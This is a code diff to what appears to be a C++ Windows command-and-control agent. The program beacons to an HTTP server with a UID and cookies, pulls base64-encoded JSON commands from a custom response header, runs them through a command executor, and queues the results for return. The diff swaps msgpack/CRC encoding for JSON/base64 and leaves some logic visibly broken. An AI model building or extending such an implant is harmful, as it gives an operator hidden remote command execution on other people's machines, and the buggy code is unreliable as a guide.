@@ -11,8 +11,10 @@
 #include <algorithm>
 #include "command.h"
 #include <vector>
-#include "C:\msys64\ucrt64\include\zlib\zlib.h"
-#include <nlohmann\json.hpp>
+#include <zlib/zlib.h>
+#include <nlohmann/json.hpp>
+#include "misc.h"
+#include "base64.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -27,32 +29,8 @@ std::string encodedParams;
 CommandQueue queue;
 int key;
 std::string cmdResponse;
-
-struct Command {
-    std::string Group;
-    std::string String;
-    std::string Response;
-};
-
-// Function to serialize a Command object
-std::vector<uint8_t> serializeCommand(const Command& acmd) {
-    // Pack the Command object into a std::vector<uint8_t>
-    using namespace msgpack_lite;
-    std::vector<uint8_t> sbuf;
-    Packer packer(sbuf, acmd);
-
-    return sbuf;
-}
-// Function to deserialize a Command object
-Command deserializeCommand(const std::vector<uint8_t>& packedData) {
-    // Create a msgpack::object_handle to hold the deserialized data
-    using namespace msgpack_lite;
-    Unpacker unpacker(std::cin);
-    msgpack_lite::object_handle oh = unpacker(packedData.data(), packedData.size());
-
-    // Convert the msgpack::object to a Command object
-    return oh.get().as<Command>();
-}
+cmdStruct msg;
+using namespace std;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -102,58 +80,69 @@ std::string createCookiesString() {
     return cookies;
 }
 
+
+// Serialize Queue object to JSON
+void to_json(json& j, const Queue& q) {
+    j = json{{"Group", q.Group}, {"String", q.String}, {"Response", q.Response}};
+}
+
 std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
-    
     if (!queue.empty()) {
-        
-        auto it = queue.begin();
-       
-        auto& cmdqueue = it->second;
-        
-        std::string cmdGroup = cmdqueue.Group;
-        std::string cmdString = cmdqueue.String;
-        std::string cmdResponse = cmdqueue.Response;
+        std::cout << "Queue" << std::endl;
+        auto it = queue.begin(); 
 
-///
-        // Create an instance of your structure
-        Command s{cmdGroup, cmdString, cmdResponse};
+        // Accessing the first element using the iterator
+        int key = it->first;
+        Queue& queueElement = it->second;
+        std::string cmdGroup = queueElement.Group;
+        std::string cmdString = queueElement.String;
+        std::string cmdResponse = queueElement.Response;
+        /*
+        std::cout << "Group: " << cmdGroup << std::endl;
+        std::cout << "Sring: " << cmdString << std::endl;
+        std::cout << "Response: " << cmdResponse << std::endl;
+        */
+        // Create Message structure
+        cmdStruct msg;
+        msg.Group = cmdGroup;
+        msg.String = cmdString;
+        msg.Response = cmdResponse;
 
-        // Serialize the structure to MessagePack
-        std::vector<uint8_t> packed;
-        msgpackpp::sbuffer sbuf;
-        msgpackpp::packer(sbuf, s);
-        packed.assign(sbuf.data(), sbuf.data() + sbuf.size());
-    
-        // Calculate CRC32 hash
-        uint32_t crc32_hash = crc32(0L, (const Bytef *)data.c_str(), data.length()); ;
+        // Convert Message structure to JSON
+        json j;
+        j["Group"] = msg.Group;
+        j["String"] = msg.String;
+        j["Response"] = msg.Response;
 
-       // Append CRC32 hash to the serialized data
-        packed.insert(packed.end(), reinterpret_cast<const uint8_t*>(&crc32_hash), reinterpret_cast<const uint8_t*>(&crc32_hash) + sizeof(uint32_t));
+        string jsonStr = j.dump();
 
+        // Base64 encode
+        std::string baseJ = macaron::Base64::Encode(jsonStr);
 
-///
+        // Build the GET request string
         std::string cookiesString = createCookiesString(); 
-        std::string queryParams = "aa:", packed; // "UID:", "UIDString";
-        std::string encodedParams = base64_encode(queryParams);
-
-        removeFromQueue(queue, it->first); // Passing the key to removeFromQueue
+        std::string getRequest = "GET /" + path + " HTTP/1.1\r\n"
+                                + "Host: " + host + "\r\n"
+                                + "Connection: Keep-Alive\r\n"
+                                + "Keep-Alive: timeout=15, max=1000\r\n" 
+                                + "Cookies: " + cookiesString + "\r\n"
+                                + "Serialized-Data: " + baseJ + "\r\n"
+                                + "UID: " + misc::uid + "\r\n"
+                                + "\r\n";
+        removeFromQueue(queue);
+        return getRequest;
     
-        return "GET /" + path + "?" + "aa=" + encodedParams + " HTTP/1.1\r\n"
-               "Host: " + host + "\r\n"
-               "Connection: Keep-Alive\r\n"
-               "Keep-Alive: timeout=15, max=1000\r\n" 
-               "Cookie: " + cookiesString + "\r\n"    
-               "\r\n"; 
-        
     } else {
         // Queue is empty, return request without command information;
         std::string cookiesString = createCookiesString(); 
-        return "GET /" + path + "?" + " HTTP/1.1\r\n"
-               "Host: " + host + "\r\n"
-               "Connection: Keep-Alive\r\n"
-               "Keep-Alive: timeout=15, max=1000\r\n" 
-               "Cookie: " + cookiesString + "\r\n"    
-               "\r\n";
+        std::string getRequest = "GET /" + path + " HTTP/1.1\r\n"
+                                + "Host: " + host + "\r\n"
+                                + "Connection: Keep-Alive\r\n"
+                                + "Keep-Alive: timeout=15, max=1000\r\n" 
+                                + "Cookies: " + cookiesString + "\r\n"
+                                + "UID: " + misc::uid + "\r\n"
+                                + "\r\n";
+        return getRequest;
     }
 }
 
@@ -214,7 +203,6 @@ std::string http_get(const std::string& url) {
     }
 
     std::vector<char> response_data = receive_data(ConnectSocket);
-
     std::string cmdValue = extractCMD(response_data);
     req_body.clear();
 
@@ -224,66 +212,52 @@ std::string http_get(const std::string& url) {
 }
 
 std::string extractCMD(const std::vector<char>& data) {
-///
-    std::vector<uint8_t> received_serialized_data_with_crc = data;
+    std::string dataStr(data.begin(), data.end());
+    std::istringstream ss(dataStr);
+    std::string line;
+    std::string base64_str;
 
-    // Validate CRC32 hash
-    uint32_t received_crc32;
-    std::memcpy(&received_crc32, received_serialized_data_with_crc.data() + received_serialized_data_with_crc.size() - sizeof(uint32_t), sizeof(uint32_t));
-    uint32_t calculated_crc32 = crc32(0L, (const Bytef *)data.c_str(), data.length()); ;
-
-    if (calculated_crc32 == received_crc32) {
-        // CRC32 hash validation successful, deserialize the data
-        Command deserialized_s;
-        msgpackpp::object_handle oh = msgpackpp::unpack(received_serialized_data_with_crc.data(), received_serialized_data_with_crc.size());
-        oh.get().convert(deserialized_s);
-        
-        cmdGroup = deserialized_s.Group;
-        cmdString = deserialized_s.String;
-        
-        std::cout << "Deserialized Command:" << std::endl;
-        std::cout << "cmdGroup: " << cmdGroup << std::endl;
-        std::cout << "cmdString: " << cmdString << std::endl;
-    } else {
-        std::cout << "CRC32 hash validation failed" << std::endl;
+    while (std::getline(ss, line)) {
+        if (line.find("Serialized-Data:") != std::string::npos) {
+            size_t pos = line.find("Serialized-Data:");
+            if (pos != std::string::npos) {
+                pos += strlen("Serialized-Data:"); 
+                base64_str = line.substr(pos); // Extract the substring after "Serialized-Data:"
+                std::cout << "Base64 string found: " << base64_str << std::endl; // Debug output
+                break; // Exit the loop since we found what we needed
+            }
+        }
     }
-///
+    base64_str.erase(std::remove_if(base64_str.begin(), base64_str.end(), ::isspace), base64_str.end());
+    if (!base64_str.empty()) {
+        try {
+            std::string out;
+            std::string decoded_data = macaron::Base64::Decode(base64_str, out);
+            // Parse JSON response
+            json jsonResponse = json::parse(out);
 
-    return cmdValue;
-}
-
-void addToQueue(CommandQueue& queue, int key, const std::string& cmdValue, const std::string& cmdString, const std::string& cmdResponse) {
-    Command command;
-    command.Group = cmdValue;
-    command.String = cmdString;
-    command.Response = cmdResponse;
-    queue[key] = command;  // Add command to the queue with the specified key
-}
-
-void removeFromQueue(CommandQueue& queue, int key) {
-    queue.erase(key);  // Remove command from the queue with the specified key
-}
-
-std::string base64_encode(const std::string &in) {
-    std::string out;
-    int len = in.length();
-    int j = 0;
-    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-    for (int i = 0; i < len; i += 3) {
-        int octet_a = in[i];
-        int octet_b = i + 1 < len ? in[i + 1] : 0;
-        int octet_c = i + 2 < len ? in[i + 2] : 0;
-
-        int triplet = (octet_a << 16) + (octet_b << 8) + octet_c;
-
-        out += base64_chars[(triplet >> 18) & 0x3F];
-        out += base64_chars[(triplet >> 12) & 0x3F];
-        out += i + 1 < len ? base64_chars[(triplet >> 6) & 0x3F] : '=';
-        out += i + 2 < len ? base64_chars[triplet & 0x3F] : '=';
+            // Extract and use value to declare a variable
+            cmdGroup = jsonResponse["Group"];
+            cmdString = jsonResponse["String"];
+ 
+        } catch (const std::invalid_argument& e) {
+            std::cout << "2" << std::endl;
+            std::cerr << "Error decoding base64: " << e.what() << std::endl;
+            // Handle error
+        }
     }
+    return "";
+}
 
-    return out;
+
+void addToQueue(CommandQueue& queue, int key, const std::string& cmdGroup, const std::string& cmdString, const std::string& cmdResponse) {
+    queue[key] = Queue{cmdGroup, cmdString, cmdResponse};  // Add command to the queue with the specified key
+}
+
+void removeFromQueue(CommandQueue& queue) {
+    if (!queue.empty()) {
+        queue.erase(queue.begin()); // Erase the first element
+    }
 }
 
 bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
@@ -345,9 +319,18 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
         addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
         wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
     }
+    cmdGroup.clear();
     cmdString.clear();
-    queryParams.clear();
-    encodedParams.clear();
+    cmdResponse.clear();
+
+    msg.Group.clear();
+    msg.String.clear();
+    msg.Response.clear();
+
+    json j;
+    j["Group"] = msg.Group;
+    j["String"] = msg.String;
+    j["Response"] = msg.Response;
 
     return buffer;
 }
